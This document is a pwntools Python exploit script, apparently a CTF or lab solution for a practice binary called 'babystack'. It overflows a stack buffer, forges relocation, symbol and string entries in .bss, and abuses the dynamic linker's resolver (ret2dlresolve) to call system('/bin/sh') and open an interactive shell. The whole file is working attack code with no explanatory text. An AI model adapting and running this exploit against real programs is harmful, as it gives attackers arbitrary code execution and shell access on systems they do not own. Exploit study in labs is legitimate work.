
from pwn import *

io = process('../ex1-rop/babystack')
elf = ELF('../ex1-rop/babystack')


bss = 0x804a020
dynstr = 0x804822c
dynsym = 0x80481cc
relplt = 0x80482b0


vuln = p32(0x804843b)
resolve = p32(0x80482f0)


payload0 = b"a"*44                        
payload0 += p32(elf.symbols['read'])    
payload0 += vuln                    
payload0 += p32(0)                  
payload0 += p32(bss)  


dynsym_offset = ((bss + 0xc) - dynsym) >> 4  # 0x10
r_info = (dynsym_offset << 8) | 0x7


dynstr_index = (bss + 28) - dynstr

# .rel.plt
payload1 = p32(elf.got['read'])
payload1 += p32(r_info)

payload1 += p32(0x0)

# dynsym 
payload1 += p32(dynstr_index)
payload1 += p32(0xde)*3

# dynstr
payload1 += b"system\x00"

# binsh
payload1 += b"/bin/sh\x00"


payload1_size = len(payload1)

              
payload0 += p32(payload1_size) 


io.send(payload0)
io.send(payload1)


binsh_bss_address = bss + 35
ret_plt_offset = bss - relplt

payload2 = b"0"*44
payload2 += resolve                 
payload2 += p32(ret_plt_offset)        
payload2 += p32(0xdeadbeef)            
payload2 += p32(binsh_bss_address)   

io.send(payload2)

io.interactive()
